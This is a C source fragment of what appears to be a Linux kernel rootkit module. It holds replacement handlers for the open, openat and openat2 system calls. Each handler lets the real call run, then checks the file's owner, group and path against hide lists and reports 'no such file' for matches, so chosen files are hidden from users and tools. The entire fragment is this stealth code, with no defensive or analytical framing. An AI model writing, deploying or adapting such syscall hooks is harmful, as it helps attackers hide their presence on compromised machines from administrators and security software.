/*
    Находятся в resources/hide_files_functions.c

    bool copy_filepath(char *filepath, char **kfilepath);
    bool is_hide_uid(unsigned int file_uid);
    bool is_hide_gid(unsigned int file_gid);
    bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath);

    unsigned int uids[];
    unsigned int gids[];
    struct Extended_array ea_uids;
    struct Extended_array ea_gids;
*/
// ===================== Перехват функций ===============================

/*
    asmlinkage long sys_open(
        const char __user *filename,    - di
        int flags,                      - si
        umode_t mode                    - dx
        );
*/
static asmlinkage long ex_sys_open(struct pt_regs *regs)
{
    long ret = real_sys_open(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct inode *f_inode = current->files->fdt->fd[(int)ret]->f_inode;

    if (!copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(f_inode->i_uid.val, f_inode->i_gid.val, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    if (kfilepath) {
        kfree(kfilepath);
    }
    return ret;
}

/*
    asmlinkage long sys_openat(
        int dfd,                        - di
        const char __user *filename,    - si
        int flags,                      - dx
        umode_t mode                    - r10
        );
*/
static asmlinkage long ex_sys_openat(struct pt_regs *regs)
{
    long ret = real_sys_openat(regs);

    if (ret < 0) {
        return ret;
    } 

    char *kfilepath;
    struct inode *f_inode = current->files->fdt->fd[(int)ret]->f_inode;

    if (!copy_filepath((char *)regs->si, &kfilepath) ||
        !is_hide_file(f_inode->i_uid.val, f_inode->i_gid.val, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    if (kfilepath) {
        kfree(kfilepath);
    }
    return ret;
}

/*
    asmlinkage long sys_openat2(
        int dfd,                        - di
        const char __user *filename,    - si
        struct open_how __user *how,    - dx
        size_t size                     - r10
        );

*/
static asmlinkage long ex_sys_openat2(struct pt_regs *regs)
{
    long ret = real_sys_openat2(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct inode *f_inode = current->files->fdt->fd[(int)ret]->f_inode;

    if (!copy_filepath((char *)regs->si, &kfilepath) ||
        !is_hide_file(f_inode->i_uid.val, f_inode->i_gid.val, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    if (kfilepath) {
        kfree(kfilepath);
    }
    return ret;
}
